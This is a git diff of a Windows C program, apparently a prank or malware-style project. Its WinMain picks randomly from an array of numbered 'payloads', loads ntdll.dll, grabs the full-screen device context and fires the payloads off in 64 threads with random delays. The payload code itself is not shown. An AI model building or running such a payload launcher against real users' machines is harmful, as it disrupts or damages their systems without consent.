@@ -102,6 +102,10 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         p36
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
     
+    HDC desk = GetDC(NULL);
+    INT w = GetDeviceCaps(desk, HORZRES);
+    INT h = GetDeviceCaps(desk, VERTRES);
+
     DWORD zero = 0;
 
     HMODULE ntdll = LoadLibraryA("ntdll.dll");
@@ -249,11 +253,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     }
 
     fori(64) {
-<<<<<<< Updated upstream
-        int r = rand() % 36 + 1;
-=======
-        int r = (rand() % 35) + 1;
->>>>>>> Stashed changes
+        int r = rand() % 38 + 1;
         CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[r], NULL, 0, NULL);
         Sleep(rand() % 5000);
     }
